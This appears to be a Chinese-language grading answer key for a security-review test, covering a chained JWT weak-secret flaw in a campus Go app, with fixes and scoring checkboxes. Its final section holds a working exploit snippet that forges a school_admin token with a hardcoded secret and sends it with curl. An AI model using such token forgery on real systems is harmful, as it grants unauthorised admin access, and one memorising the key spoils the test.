# R02 Truth

## 分类
R1 - 漏洞串联提权

## 位置
- 信息源: campus_go/internal/middleware/auth.go (S01)
- 攻击面: 所有JWT保护端点
- 提权目标: school_admin角色

## 根因
JWT弱密钥(S01 LOW) + 缺少密钥轮换机制 = 持久化伪造能力。
破阵应识别：两个LOW漏洞串联→等效HIGH影响→优先级提升。

## 修复
1. 立即：删除JWT弱密钥回退(铁壁S01修复)
2. 短期：添加JWT密钥轮换机制
3. 长期：实现token revocation list

## 评分要点
- [ ] Phase 3(漏洞串联)是否执行？
- [ ] 是否识别出S01→JWT伪造的串联路径？
- [ ] 是否将串联风险标记为HIGH（尽管单个是LOW）？
- [ ] 攻击链5阶段是否完整？
- [ ] 修复是否覆盖根因而非症状？

## 攻击验证
```bash
# 伪造admin token
python -c "
import jwt
token = jwt.encode({'user_id':1,'role':'school_admin','ver':999}, 'campus-secret-key-2024', algorithm='HS256')
print(token)
"
# 访问管理接口
curl -H "Authorization: Bearer $token" http://target/api/me
```
